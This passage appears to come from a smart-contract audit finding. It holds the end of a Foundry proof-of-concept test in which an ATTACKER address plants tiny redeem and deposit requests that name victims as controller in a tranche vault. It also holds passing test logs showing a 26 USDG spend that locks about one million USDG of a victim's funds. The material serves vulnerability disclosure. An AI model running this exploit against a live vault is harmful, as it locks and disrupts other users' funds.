        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal returns (uint256 id) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    /// @dev Before any trader position exists the epoch settles through the cached-mark entrypoint.
    function _settleNoPosition(
        uint256 epochId
    ) internal {
        vm.warp(pool.lpEpochStart(epochId));
        pool.settleLpEpoch(0, 0);
    }

    function _claimDep(
        TrancheVault vault,
        uint256 id,
        address lp
    ) internal returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        shares = vault.claimDeposit(id, assets, lp, lp);
    }

    /// @dev ATTACKER hands exactly 1 share-wei to a fresh address, which names `victim` as the controller.
    function _plant(
        address mule,
        address victim
    ) internal returns (uint256 id) {
        vm.prank(ATTACKER);
        juniorVault.transfer(mule, 1);
        vm.prank(mule);
        id = juniorVault.requestRedeem(1, victim, mule);
    }

    /// @dev ATTACKER queues a 1 USDG lot for BOB. Even epochs use requestDeposit(assets, controller, owner), odd epochs
    ///      use requestDeposit(assets, receiver), which makes the caller the owner and any address the controller.
    function _fundLot(
        uint256 k
    ) internal returns (uint256 id) {
        _setBasket(k);
        router.updateMarkPrice(_updateData());
        settlementToken.mint(ATTACKER, LOT);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), LOT);
        id = k % 2 == 0 ? juniorVault.requestDeposit(LOT, BOB, ATTACKER) : juniorVault.requestDeposit(LOT, BOB);
        vm.stopPrank();
    }

}
```

### Output

```
Ran 1 test for test/perps/TrancheControllerConsent.t.sol:TrancheControllerConsentTest
[PASS] test_ConsentGap_StrangerNamesVictimAsController() (gas: 32487717)
Logs:
  Alice funded exit, standard claims dead (USDG): 250012.885740
  controller contract funded exit (USDG): 200010.308592
  Alice balance left after the exit (USDG): 250012.885698
  attacker spend (USDG): 26.000000
  Bob wallet locked, in USDG: 1000039.081290
  hours from first stamp to last expiry: 26

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.53ms (29.94ms CPU time)

Ran 1 test suite in 34.87ms (34.53ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
